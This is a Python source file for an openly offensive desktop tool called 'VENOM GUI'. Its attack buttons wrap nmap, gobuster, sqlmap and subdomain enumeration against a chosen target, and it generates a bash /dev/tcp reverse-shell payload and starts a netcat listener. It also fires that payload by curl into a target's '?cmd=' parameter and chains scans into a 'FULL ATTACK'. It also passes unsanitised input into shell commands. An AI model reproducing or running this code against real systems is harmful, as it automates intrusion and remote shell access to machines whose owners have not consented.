#!/usr/bin/env python3
# VENOM GUI - FIXED VERSION (NO GRID/PACK CONFLICT)

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import subprocess
import threading
import os
import sys
import time
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
RESULTS_DIR = os.path.join(BASE_DIR, "results")
WORDLIST_DIR = os.path.join(BASE_DIR, "wordlists")
os.makedirs(RESULTS_DIR, exist_ok=True)
os.makedirs(WORDLIST_DIR, exist_ok=True)

def run_command(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
        return r.stdout + r.stderr
    except subprocess.TimeoutExpired:
        return "[-] Timeout"
    except Exception as e:
        return str(e)

class VenomGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("VENOM GUI - Kalz Unbreakable Core")
        self.root.geometry("1200x700")
        self.root.configure(bg='#1a1a1a')
        
        self.target_ip = tk.StringVar()
        self.target_url = tk.StringVar()
        self.target_domain = tk.StringVar()
        self.lhost = tk.StringVar()
        self.lport = tk.StringVar()
        
        self.setup_ui()

    def setup_ui(self):
        # HEADER
        header = tk.Label(self.root, text="[»kalz pro Active!!«]  VENOM GUI - UNBREAKABLE CORE",
                         fg="red", bg="black", font=('Courier', 16, 'bold'), pady=10)
        header.pack(fill=tk.X)

        # MAIN PANEL (left/right)
        main_frame = tk.Frame(self.root, bg='#1a1a1a')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # LEFT PANEL (control) - semua pakai pack()
        left = tk.LabelFrame(main_frame, text="CONTROL PANEL", bg='#1a1a1a', fg='#00ff00', font=('Courier', 10))
        left.pack(side=tk.LEFT, fill=tk.Y, padx=(0,10))

        # Target section
        tk.Label(left, text="Target IP:", bg='#1a1a1a', fg='#00ff00').pack(anchor='w', padx=5, pady=(10,0))
        tk.Entry(left, textvariable=self.target_ip, width=30, bg='#2d2d2d', fg='#00ff00', insertbackground='white').pack(padx=5, pady=2, fill=tk.X)

        tk.Label(left, text="Target URL:", bg='#1a1a1a', fg='#00ff00').pack(anchor='w', padx=5, pady=(5,0))
        tk.Entry(left, textvariable=self.target_url, width=30, bg='#2d2d2d', fg='#00ff00').pack(padx=5, pady=2, fill=tk.X)

        tk.Label(left, text="Domain:", bg='#1a1a1a', fg='#00ff00').pack(anchor='w', padx=5, pady=(5,0))
        tk.Entry(left, textvariable=self.target_domain, width=30, bg='#2d2d2d', fg='#00ff00').pack(padx=5, pady=2, fill=tk.X)

        # Reverse Shell section
        tk.Label(left, text="--- REVERSE SHELL ---", bg='#1a1a1a', fg='#ffff00').pack(pady=(15,5))
        tk.Label(left, text="LHOST:", bg='#1a1a1a', fg='#00ff00').pack(anchor='w', padx=5)
        tk.Entry(left, textvariable=self.lhost, width=30, bg='#2d2d2d', fg='#00ff00').pack(padx=5, pady=2, fill=tk.X)
        tk.Label(left, text="LPORT:", bg='#1a1a1a', fg='#00ff00').pack(anchor='w', padx=5)
        tk.Entry(left, textvariable=self.lport, width=30, bg='#2d2d2d', fg='#00ff00').pack(padx=5, pady=2, fill=tk.X)

        # Buttons
        tk.Label(left, text="--- ATTACKS ---", bg='#1a1a1a', fg='#ffff00').pack(pady=(15,5))
        buttons = [
            ("1. Ping Sweep", self.ping_sweep),
            ("2. Port Scan", self.port_scan),
            ("3. Dir Brute", self.dir_brute),
            ("4. SQL Detect", self.sql_detect),
            ("5. Subdomain Scan", self.subdomain_scan),
            ("6. WhatWeb", self.whatweb_scan),
            ("7. Nmap Full", self.nmap_full),
            ("8. Gen Reverse Shell", self.revshell_gen),
            ("9. Start Listener", self.start_listener),
            ("10. Send Payload", self.send_payload),
            ("11. FULL ATTACK", self.full_attack)
        ]
        for text, cmd in buttons:
            bg_color = '#8b0000' if "FULL" in text else '#333333'
            btn = tk.Button(left, text=text, command=cmd, bg=bg_color, fg='white', font=('Courier', 9))
            btn.pack(fill=tk.X, pady=2, padx=5)

        # Clear console button
        tk.Button(left, text="CLEAR CONSOLE", command=self.clear_console, bg='#8b0000', fg='white').pack(fill=tk.X, pady=10, padx=5)

        # RIGHT PANEL (output console)
        right = tk.LabelFrame(main_frame, text="CONSOLE OUTPUT", bg='#1a1a1a', fg='#00ff00')
        right.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

        self.console = scrolledtext.ScrolledText(right, wrap=tk.WORD, bg='black', fg='#00ff00', font=('Courier', 9))
        self.console.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Status bar
        self.status = tk.Label(self.root, text="Ready", bd=1, relief=tk.SUNKEN, anchor='w', bg='black', fg='red')
        self.status.pack(side=tk.BOTTOM, fill=tk.X)

        self.log("[*] VENOM GUI Ready.")

    def log(self, msg):
        self.console.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n")
        self.console.see(tk.END)
        self.root.update()

    def update_status(self, msg):
        self.status.config(text=msg)
        self.root.update()

    def clear_console(self):
        self.console.delete(1.0, tk.END)
        self.log("[*] Console cleared.")

    def run_thread(self, target):
        threading.Thread(target=target, daemon=True).start()

    # ========== ATTACKS ==========
    def ping_sweep(self):
        ip = self.target_ip.get().strip()
        if not ip:
            messagebox.showerror("Error", "Target IP required")
            return
        self.log(f"[*] Ping sweep on {ip}.0/24")
        def work():
            out = run_command(f"ping -c 1 -W 1 {ip}.1")
            self.log(out)
            self.update_status("Ready")
        self.run_thread(work)

    def port_scan(self):
        ip = self.target_ip.get().strip()
        if not ip:
            messagebox.showerror("Error", "Target IP required")
            return
        self.log(f"[*] Port scan (1-1000) on {ip}")
        def work():
            out = run_command(f"nmap -p 1-1000 -T4 {ip}")
            self.log(out)
            self.update_status("Ready")
        self.run_thread(work)

    def dir_brute(self):
        url = self.target_url.get().strip()
        if not url:
            messagebox.showerror("Error", "Target URL required")
            return
        wl = os.path.join(WORDLIST_DIR, "dirs.txt")
        if not os.path.exists(wl):
            self.log("[-] Wordlist not found, creating default...")
            os.makedirs(WORDLIST_DIR, exist_ok=True)
            with open(wl, 'w') as f:
                f.write("admin\nlogin\nwp-admin\nbackup\nconfig\nuploads\nimages\napi\nv1\napp\ndev\ntest\n")
        self.log(f"[*] Directory brute on {url} using {wl}")
        def work():
            out = run_command(f"gobuster dir -u {url} -w {wl} -t 50")
            self.log(out)
            self.update_status("Ready")
        self.run_thread(work)

    def sql_detect(self):
        url = self.target_url.get().strip()
        if not url:
            messagebox.showerror("Error", "Target URL required")
            return
        self.log(f"[*] SQL injection scan on {url}")
        def work():
            out = run_command(f"sqlmap -u {url} --batch --level=3")
            self.log(out)
            self.update_status("Ready")
        self.run_thread(work)

    def subdomain_scan(self):
        dom = self.target_domain.get().strip()
        if not dom:
            messagebox.showerror("Error", "Domain required")
            return
        self.log(f"[*] Subdomain enumeration on {dom}")
        def work():
            out = run_command(f"sublist3r -d {dom}")
            self.log(out)
            self.update_status("Ready")
        self.run_thread(work)

    def whatweb_scan(self):
        url = self.target_url.get().strip()
        if not url:
            messagebox.showerror("Error", "Target URL required")
            return
        self.log(f"[*] WhatWeb scan on {url}")
        def work():
            out = run_command(f"whatweb {url}")
            self.log(out)
            self.update_status("Ready")
        self.run_thread(work)

    def nmap_full(self):
        ip = self.target_ip.get().strip()
        if not ip:
            messagebox.showerror("Error", "Target IP required")
            return
        self.log(f"[*] Nmap full scan on {ip}")
        def work():
            out = run_command(f"nmap -sV -sC -p- -T4 {ip}")
            self.log(out)
            self.update_status("Ready")
        self.run_thread(work)

    def revshell_gen(self):
        lh = self.lhost.get().strip()
        lp = self.lport.get().strip()
        if not lh or not lp:
            messagebox.showerror("Error", "LHOST and LPORT required")
            return
        payload = f"bash -i >& /dev/tcp/{lh}/{lp} 0>&1"
        self.log(f"[!] Reverse shell payload:")
        self.log(payload)
        self.log(f"[*] Start listener: nc -lvnp {lp}")
        self.update_status("Ready")

    def start_listener(self):
        lp = self.lport.get().strip()
        if not lp:
            messagebox.showerror("Error", "LPORT required")
            return
        self.log(f"[*] Starting netcat listener on port {lp}")
        def work():
            run_command(f"nc -lvnp {lp}")
        self.run_thread(work)

    def send_payload(self):
        ip = self.target_ip.get().strip()
        lh = self.lhost.get().strip()
        lp = self.lport.get().strip()
        if not ip or not lh or not lp:
            messagebox.showerror("Error", "Target IP, LHOST, LPORT required")
            return
        payload = f"bash -i >& /dev/tcp/{lh}/{lp} 0>&1"
        encoded = payload.replace(' ', '%20').replace('&', '%26')
        url = f"http://{ip}/?cmd={encoded}"
        self.log(f"[*] Sending payload to {url}")
        def work():
            out = run_command(f"curl -s '{url}'")
            self.log("[+] Payload sent (if vulnerable, check listener)")
            self.update_status("Ready")
        self.run_thread(work)

    def full_attack(self):
        ip = self.target_ip.get().strip()
        if not ip:
            messagebox.showerror("Error", "Target IP required")
            return
        self.log("[!] STARTING FULL ATTACK SEQUENCE")
        def work():
            self.log("[1] Nmap full scan...")
            out1 = run_command(f"nmap -sV -p- -T4 {ip}")
            self.log(out1)
            self.log("[2] WhatWeb scan...")
            out2 = run_command(f"whatweb http://{ip}")
            self.log(out2)
            self.log("[3] SQL injection scan...")
            out3 = run_command(f"sqlmap -u http://{ip}/index.php?id=1 --batch --level=3")
            self.log(out3)
            self.log("[+] FULL ATTACK COMPLETED")
            self.update_status("Ready")
        self.run_thread(work)

if __name__ == "__main__":
    root = tk.Tk()
    app = VenomGUI(root)
    root.mainloop()
